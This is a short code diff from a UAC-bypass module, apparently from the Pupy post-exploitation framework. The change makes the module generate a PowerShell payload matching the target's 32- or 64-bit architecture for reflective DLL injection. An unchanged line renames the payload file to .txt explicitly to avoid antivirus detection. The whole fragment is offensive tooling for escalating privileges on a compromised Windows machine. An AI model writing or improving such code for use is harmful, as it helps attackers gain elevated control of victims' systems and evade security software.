@@ -68,11 +68,10 @@ class BypassUAC(PupyModule):
         # use powershell
         if not args.exe and not args.restart:
             self.info('Using powershell payload')
-            #The x86 dll will be used by Invoke-ReflectiveDllInjection (on the target) only, even if x64 target arch. 
-            #If you use a x64 dll on x64 arch, the following error will occur in Invoke-ReflectiveDllInjection
-            #"PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
-            #Tested on x64 Wind7 (up-to-date) [version 6.1.7601]
-            local_file = pupygen.generate_ps1(self.client.get_conf(), x86=True)
+            if '64' in  self.client.desc['os_arch']:
+                local_file = pupygen.generate_ps1(self.client.get_conf(), x64=True)
+            else:
+                local_file = pupygen.generate_ps1(self.client.get_conf(), x86=True)
 
             # change the ps1 to txt file to avoid AV detection
             random_name += '.txt'
